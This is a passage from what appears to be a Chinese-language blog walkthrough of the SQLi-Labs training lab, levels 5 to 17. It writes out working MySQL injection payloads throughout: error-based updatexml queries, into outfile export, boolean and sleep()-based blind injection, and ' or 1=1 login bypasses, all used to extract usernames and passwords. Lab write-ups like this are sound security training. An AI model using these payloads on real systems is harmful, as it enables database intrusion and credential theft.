class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; and updatexml(1,concat(1,(select database())),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722083545772.png" alt="image-20240722083545772"></p><p>爆数据表，使用information_schema库查看数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; and updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722083846890.png" alt="image-20240722083846890"></p><p>爆数据表内字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; and updatexml(1,concat(1,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722084102628.png" alt="image-20240722084102628"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722084052028.png" alt="image-20240722084052028"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722084113546.png" alt="image-20240722084113546"></p><p>爆数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; and updatexml(1,concat(1,(select username from users limit 0,1)),1)--+</span><br><span class="line">?id=0&#x27; and updatexml(1,concat(1,(select password from users limit 0,1)),1)--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722084645285.png" alt="image-20240722084645285"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722084655699.png" alt="image-20240722084655699"></p><p>按照顺序一直往下爆破即可</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>方法与Less-5一样，只需将单引号替换为双引号即可</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>此关提示使用dump into outfile也就是使用文件导出的方法进行注入</p><p>前提条件：MySql 使用 <strong>secure-file-priv</strong> 参数对文件读写进行限制，当参数值为 null 时无法进行文件导出操作，使用这条命令可以查看：<code>show variables like &#39;%secure%&#39;;</code>，通过修改 MySQL 下的 my.ini 配置文件就可以启用权限，需要把下面这个字符串写入文件中。<code>secure_file_priv=&quot;/&quot;</code>，再次查看此参数，若参数值不为 null 则修改成功。</p><p>首先查询网站主目录</p><p>此关无回显，只能通过之前的关卡得知主目录</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722091015448.png" alt="image-20240722091015448"></p><p>由此可推断出，这是带双括号的单引号注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722091547745.png" alt="image-20240722091547745"></p><p>读写权限测试，如果返回正常则有读取权限</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722091725033.png" alt="image-20240722091725033"></p><p>利用into outfile 进行查看数据，这里报错为正常，文件已生成</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722092641419.png" alt="image-20240722092641419"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722092919348.png" alt="image-20240722092919348"></p><p>下面根据之前的关卡注入的顺序进行查询数据，注意：导出的文件名不能重复，重复不会覆盖</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722093149100.png" alt="image-20240722093149100"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722093302877.png" alt="image-20240722093302877"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722093346541.png" alt="image-20240722093346541"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722093439165.png" alt="image-20240722093439165"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>根据题目提示可知这是单引号注入且需要通过盲注进行通关，那么首先利用单引号看一下网页的回显</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722094202560.png" alt="image-20240722094202560"></p><p>测试是否是注入点</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722094319258.png" alt="image-20240722094319258"></p><p>发现什么也没有，也就是说网页不会返回任何报错信息，也不会返回其他信息即没有任何回显信息</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722094055378.png" alt="image-20240722094055378"></p><p>Less1、5、7、8回显对比</p><table><thead><tr><th>Less</th><th>注入方法</th><th>正确回显</th><th>错误回显</th></tr></thead><tbody><tr><td>1</td><td>基于错误注入</td><td>查询到的用户名和密码</td><td>Mysql错误信息</td></tr><tr><td>5</td><td>双注入&#x2F;盲注</td><td>You are in………..</td><td>Mysql错误信息</td></tr><tr><td>7</td><td>导出文件注入</td><td>You are in…. Use outfile……</td><td>You have an error in your SQL syntax</td></tr><tr><td>8</td><td>Bool型盲注</td><td>You are in………..</td><td>无任何信息</td></tr></tbody></table><p>查看源代码后发现虽然不会报错，但是可以通过正确回显和错误回显返回页面数据的不同进行对比，正确为true，错误为false，可以利用布尔盲注进行猜数据库信息</p><p>利用 left(version(),1)进行尝试，查看一下 version()，这里猜测版本号第一位为5，结果为正确</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722094732048.png" alt="image-20240722094732048"></p><p>查看数据库的长度，长度为8 时，正确回显，说明长度为8</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722095046761.png" alt="image-20240722095046761"></p><p>猜测数据库第一位 </p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722095515147.png" alt="image-20240722095515147"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722095527081.png" alt="image-20240722095527081"></p><p>知道后台数据库名为 security，所以看它的第一位是否 &gt; r,很明显的是 s &gt; r,因此正确回显。当不知情的情况下，可以用二分法来提高注入的效率。（比对使用ascii码，s:115  r:114）</p><p>接下来就继续猜测第三位，第四位，直到猜出正确的数据库</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722095904537.png" alt="image-20240722095904537"></p><p>利用 substr() ascii()函数进行猜解security数据库表</p><p>猜第一个表的第一个字符（ASCII： 80-P 100-d 101-e 一般表名都是小写的，这里用80只是举例子）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722100007657.png" alt="image-20240722100007657"></p><p>页面回显正确</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722100030777.png" alt="image-20240722100030777"></p><p>页面回显正常</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240722100054072.png" alt="image-20240722100054072"></p><p>页面回显错误</p><p>由此推断出securrity第一个表的第一个字符为e（要特别注意的是语句之间是一个空格，可能会导致返回异常，经过研究发现，如果对注入语句进行url编码，那么多几个空格都不会返回异常了，这种最保险。）</p><p>获取第一个表的第二个字符(ASCII码： 108-l  109-m)，可推断出第一个表第二个字符为m，同理推出第3,4,5,6字符，最终推出emails表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80 -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;109 -- #</span><br></pre></td></tr></table></figure><p>猜数据库第二个表第一个字符(ASCII码  113-q  114-r)， 可推出第二个表第一个字符为r，同理可推出第二个表的第3,4,5,6,7,8，最终推出referers表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;80 -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;113 -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;114 -- #</span><br></pre></td></tr></table></figure><p>接下来就是重复造轮子了，然后推出了uagents表，users表，id表，毫无疑问是需要users表的信息</p><p>利用 regexp （正则表达式）获取security数据库中 users 表中的列名（字段名就是列名）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^usern[a-z]&#x27; limit 0,1) -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username[a-z]&#x27; limit 0,1) -- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1) -- #</span><br></pre></td></tr></table></figure><p>由此推出有字段username，接下来重复步骤推出字段password</p><p>利用 ord（）和 mid（）函数获取 users 表的username字段内容  （ASCII码 68-D，0x20-空格，u-117 109-m 98-b 65-A）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ord(mid((select IFNULL(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))&gt;65-- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ord(mid((select IFNULL(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))&gt;68-- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ord(mid((select IFNULL(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68-- #</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此推出第一个用户名第一个字符为D，然后重复推出完整的用户名为Dumb</p><p>获取第二个用户名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ord(mid((select IFNULL(cast(username as char),0x20) from security.users order by id limit 1,1),1,1))&gt;65-- #</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ord(mid((select IFNULL(cast(username as char),0x20) from security.users order by id limit 1,1),1,1))=65-- #</span><br></pre></td></tr></table></figure><p>由此推出第二个用户名第一个字符为A，然后重复推出完整的用户名为Angelina…..然后重复造轮子，推断出13个用户名</p><p>利用 ord（）和 mid（）函数获取 users 表的password字段内容</p><p>与上步骤雷同，只需把上面的语句username换成password即可。</p><p>PS：布尔盲注耗费时间长，建议使用python脚本（例如：sqlmap）</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>输入任何参数，页面都只有一种响应结果：You are in………..</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723082500964.png" alt="image-20240723082500964"></p><p>无回显位置，不适合联合注入；</p><p>无报错信息，不适合报错注入；</p><p>查询的正确与否不会影响页面的响应（只有一种响应），不适合布尔盲注。</p><p>综上所述，考虑使用延时盲注。</p><p>判断注入条件</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723082703615.png" alt="image-20240723082703615"></p><p>页面响应时间超过五秒，确定存在延时盲注</p><p>判断数据库名长度</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723082823185.png" alt="image-20240723082823185"></p><p>页面延时，说明长度大于1，一次递增长度判断，后面耗时长，建议使用python或其他自动化脚本猜解</p><p>枚举字符</p><p>长度确定后，依次截取每一个字符，使用穷举法判断出字符的真实内容（为了方便脚本编写，此处将字符转换为ASCLL后再进行枚举）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723083111808.png" alt="image-20240723083111808"></p><p>页面延时，说明字符的ASCLL码大于1，依次递增判断其余字符内容的可能性（32~126）。</p><p>猜解出第一个字符后，在依次判断其余字符，后面建议使用python或其他自动化脚本猜解。</p><p>下面就是脱库，附上大佬代码，当然也可以使用sqlmap（<strong>见手册末尾附录2</strong>）</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第十关和第九关一样只需要将单引号换成双引号。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>此关为账户登录页面，且请求方式从GET方法变为POST方法，参数从一个变为两个，形式大概为<code>username=参数 and password=参数</code>，需要判断字符型还是数字型注入</p><p>当输入1时出现错误图片</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723090653747.png" alt="image-20240723090653747"></p><p>在末尾加上一个单引号，出现错误信息，根据报错可以推断此关sql语句为<code>username=&#39;参数&#39; and password=&#39;参数&#39;</code><br><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723090838355.png" alt="image-20240723090838355"></p><p>了解了sql语句就可以构造一个恒成立的sql语句，这里使用<code>--+</code>注释失败，可以使用<code>#</code>进行注释，其他和第一关类似，使用联合查询即可获取想要的信息</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091114915.png" alt="image-20240723091114915"></p><p>判断出列表列数为二，回显位2个</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091307756.png" alt="image-20240723091307756"></p><p>查询出数据库名和数据库用户</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091412338.png" alt="image-20240723091412338"></p><p>下面步骤与第一题一样，这里不再赘述</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>当我们输入1’和1时候页面没有反应</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091508363.png" alt="image-20240723091508363"></p><p>当输入1”的时候页面出现报错信息，就可以知道sql语句是双引号且有括号。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091649493.png" alt="image-20240723091649493"></p><p> 那么我们可以构造下面语句进行sql注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot; ) or 1=1 #  判断是否存在sql注入。</span><br><span class="line">1&quot; ) union select 1,2#</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723091734010.png" alt="image-20240723091734010"></p><p>下面的步骤与上题类似</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>十三关和十二关差不多，只需要将双引号换成单引号。</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>十四关和十一关差不多，只需要将单引号换成双引号。</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>经过尝试，发现单引号闭合引起登录成功</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723092057411.png" alt="image-20240723092057411"></p><p>那么从这里我们可以初步判断出是单引号字符注入，且从登录失败到成功可以联想到true和false从而想到布尔盲注，此关标题也提示我们使用布尔盲注，根据之前的题目语句进行修改即可</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">猜数据库第一位：（利用二分法）：(特别提醒这里的逻辑运算符要用 <span class="keyword">or</span>)</span><br><span class="line"></span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or left(database(),1)&gt;&#x27;</span>a<span class="string">&#x27;#&amp;passwd=1          返回正确</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&#x27;</span> <span class="keyword">or</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;s&#x27;</span>#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span>          返回错误</span><br><span class="line"></span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or left(database(),1)=&#x27;</span>s<span class="string">&#x27;#&amp;passwd=1          返回正确    </span></span><br></pre></td></tr></table></figure><p>由此推断出数据库第一位为s.那么猜第二位：<code>uname=1&#39; or left(database(),2)&gt;&#39;sa&#39;#&amp;passwd=1</code> 等等。。。</p><p>另一种方法：延时注入</p><p>布尔盲注是一个思路，那么延时注入就是另一个思路了，这得参考Less-9了，知道了单引号闭合的问题，下面就直接开始吧：</p><p>PS：要是直接进行延时注入的话，不用万能语句的话就用下面的测试语句，正确的时候直接返回，不正确的时候等待 5 秒钟</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(1,1,sleep(3)) #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p>Hint：常用的判断语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or if(1,1,sleep(5))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; or if(1,1, sleep(5)) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">) or if(1,1, sleep(5)) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">or</span> if(<span class="number">1</span>,<span class="number">1</span>, sleep(<span class="number">5</span>))#</span><br><span class="line"></span><br><span class="line">&quot;) or if(1,1, sleep(5))#</span><br><span class="line">...........</span><br><span class="line">（PS：如果不能闭合，select语句会直接报错）</span><br></pre></td></tr></table></figure><p>注意：POST型延时注入比GET型延时注入还要慢，所以利用if()函数–》 正确的时候直接返回，不正确的时候等待 5 秒钟 这样的形式能加快一点点速度，且不能使用 if(1,sleep(5),1) ，原因在于uname&#x3D;1’ or if(1,sleep(5),1) 的时候 uname&#x3D;1本身是false，而if(查询语句,sleep(5),1)中查询语句为true执行sleep(5)那么语句就变成了uname&#x3D;1’ or sleep(5) # 这样的语句一看就是false，所以不能这么写。</p><p>猜数据库长度</p><p><strong>再次强调</strong><code>&amp;passwd=1</code><strong>不能少</strong>，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(length(database())=x,1,sleep(5))#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p> x从4开始增加，增加到8有明显的延迟，说明数据库的长度是8；</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(length(database())=8,1,sleep(5))#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p>喜欢整洁美观的（）就这样写（反正一样）：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or if(length(database())=8,1,sleep(5))#</span></span><br></pre></td></tr></table></figure><p>猜数据库名(可以用 &lt; &gt; &#x3D; 比较，对字符进行范围的判断，然后用二分法不断缩小范围)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or If(ascii(substr(database(),1,1))=115,1,sleep(5))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">以此类推，我们知道了数据库名字是 security</span><br></pre></td></tr></table></figure><p>猜数据库中的表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101,1,sleep(5))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> If(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">猜测第一个数据表的第一位是 e,...依次类推，得到 emails</span><br><span class="line"></span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 1,1),1,1))=114,1,sleep(5))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span> <span class="keyword">or</span> If(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">猜测第二个数据表的第一位是 r,...依次类推，得到 referers</span><br><span class="line">......</span><br><span class="line">再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723093429402.png" alt="image-20240723093429402"></p><p>猜users表里的列（ASCII码 i-105）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=database() limit 0,1),1,1))=105,1,sleep(5))#</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723094502226.png" alt="image-20240723094502226"></p><p>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password</p><p>注意：and table_schema&#x3D;database()这条语句不能少是因为要排除其他数据库可能也会有users表</p><p>猜users表里的username的值（ASCII码 D&#x3D;68）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))#</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723094603034.png" alt="image-20240723094603034"></p><p>猜测 username 的第一行的第一位<br>以此类推，我们得到数据库 username，password 的所有内容：（13个账户与密码）</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>来波小总结，参考文档（<a href="https://www.jianshu.com/p/b9ceed993ad4%EF%BC%89%EF%BC%9A">https://www.jianshu.com/p/b9ceed993ad4）：</a></p><h4 id="0x01-注入方式与回显对比"><a href="#0x01-注入方式与回显对比" class="headerlink" title="0x01. 注入方式与回显对比"></a>0x01. 注入方式与回显对比</h4><p><strong>GET</strong></p><table><thead><tr><th>Less</th><th>注入方法</th><th>正确回显</th><th>错误回显</th></tr></thead><tbody><tr><td>1</td><td>基于错误注入</td><td>查询到的用户名和密码</td><td>Mysql错误信息</td></tr><tr><td>5</td><td>双注入</td><td>固定字符串</td><td>Mysql错误信息</td></tr><tr><td>7</td><td>导出文件注入</td><td>固定字符串</td><td>另一固定字符串</td></tr><tr><td>8</td><td>Bool型盲注</td><td>固定字符串</td><td>无</td></tr><tr><td>9</td><td>Time型盲注</td><td>固定字符串</td><td>同一固定字符串</td></tr></tbody></table><p><strong>POST</strong></p><table><thead><tr><th>Less</th><th>注入方法</th><th>成功回显</th><th>失败回显</th><th>错误回显</th></tr></thead><tbody><tr><td>11</td><td>基于错误注入</td><td>用户名和密码 (flag.jpg)</td><td>无 (slap.jpg)</td><td>Mysql错误信息 (slap.jpg)</td></tr><tr><td>13</td><td>双注入</td><td>无 (flag.jpg)</td><td>无 (slap.jpg)</td><td>Mysql错误信息 (slap.jpg)</td></tr><tr><td>15</td><td>Bool&#x2F;Time型盲注</td><td>无 (flag.jpg)</td><td>无 (slap.jpg)</td><td>无 (slap.jpg)</td></tr></tbody></table><p><strong>注意：</strong>GET和POST差别在于，GET只需要提交参数<code>id</code>，而POST则需要<code>username</code>与<code>password</code>都正确。</p><h4 id="0x02-分析查询语句"><a href="#0x02-分析查询语句" class="headerlink" title="0x02. 分析查询语句"></a>0x02. 分析查询语句</h4><p>不像GET中若出现错误回显必是Mysql语法错误（提交时使id存在），POST若不返回Mysql错误信息，光凭一个登录失败是分不清是用户名和密码不正确还是出现了Mysql语法错误。</p><p>所以我们就需要在POST时构造永真条件使返回忽略用户名和密码不正确这种情况。若将查询语句闭合则会显示登陆成功，则可以依次增加小括号个数分析查询语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1--+</span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&quot; or 1=1--+</span></span><br><span class="line"><span class="string">uname=1&amp;passwd=1&#x27;</span>) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span>&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>利用了万能语句，初步确定这是一道带括号的双引号字符型注入</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723094329663.png" alt="image-20240723094329663"></p><p>下面的步骤与Less-15一样的套路，盲注&#x2F;延时注入都可以，这里演示一个</p><p>猜数据库长度： <code>uname=1&amp;passwd=1&quot;) or if(length(database())=8,1,sleep(5))#</code></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723095140801.png" alt="image-20240723095140801"></p><p>附上源码</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723095342042.png" alt="image-20240723095342042"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>此关和前面的关有很大不一样，根据页面展示是一个密码重置页面。查看源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及延时盲注都不能用了。可以使用报错注入。</p><p>判断代码：</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723100409065.png" 